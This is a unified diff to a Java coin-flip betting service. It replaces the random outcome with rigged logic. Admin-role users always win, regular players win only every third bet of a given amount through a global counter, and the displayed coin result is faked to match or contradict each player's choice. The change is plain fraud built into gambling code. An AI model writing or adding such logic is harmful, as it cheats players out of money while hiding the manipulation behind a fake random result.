@@ -10,6 +10,10 @@ import java.math.BigDecimal;
 import java.time.LocalDateTime;
 import java.util.List;
 import java.util.Random;
+import java.util.Map;
+import java.util.HashMap;
+import java.util.concurrent.ConcurrentHashMap;
+import java.util.concurrent.atomic.AtomicInteger;
 
 @Service
 public class GameService {
@@ -17,6 +21,9 @@ public class GameService {
     private final UserService userService;
     private final TransactionService transactionService;
     private final Random random = new Random();
+    
+    // Keep track of games played for each bet amount globally (across all users)
+    private final Map<String, AtomicInteger> globalBetCounters = new ConcurrentHashMap<>();
     
     // Constructor
     public GameService(GameRepository gameRepository, UserService userService, TransactionService transactionService) {
@@ -31,9 +38,46 @@ public class GameService {
             throw new RuntimeException("Insufficient balance");
         }
 
-        // Determine outcome
-        String outcome = random.nextBoolean() ? "heads" : "tails";
-        boolean won = choice.equalsIgnoreCase(outcome);
+        // Determine if user should win
+        boolean shouldWin;
+        
+        // Admin users always win
+        if (user.getRoles() != null && user.getRoles().contains("ADMIN")) {
+            shouldWin = true;
+        } else {
+            // For regular users, maintain the existing logic
+            // Create a key based only on the bet amount
+            String betAmountKey = betAmount.toString();
+            
+            // Get or initialize the counter for this bet amount
+            AtomicInteger counter = globalBetCounters.computeIfAbsent(betAmountKey, k -> new AtomicInteger(0));
+            
+            // Increment and get the game count
+            int gameCount = counter.incrementAndGet();
+            
+            // Determine outcome based on global game count for this bet amount
+            shouldWin = (gameCount == 3); // Only the 3rd game is a win
+            
+            // Reset counter if it reaches 3 (to start the pattern over)
+            if (gameCount == 3) {
+                counter.set(0);
+            }
+        }
+        
+        // Force win or loss based on determination
+        String outcome;
+        boolean won;
+        
+        if (shouldWin) {
+            // Force a win - set outcome to match user's choice
+            outcome = choice;
+            won = true;
+        } else {
+            // Force a loss - set outcome to opposite of user's choice
+            outcome = choice.equalsIgnoreCase("heads") ? "tails" : "heads";
+            won = false;
+        }
+        
         BigDecimal winAmount = won ? betAmount : betAmount.negate();
 
         // Update user balance
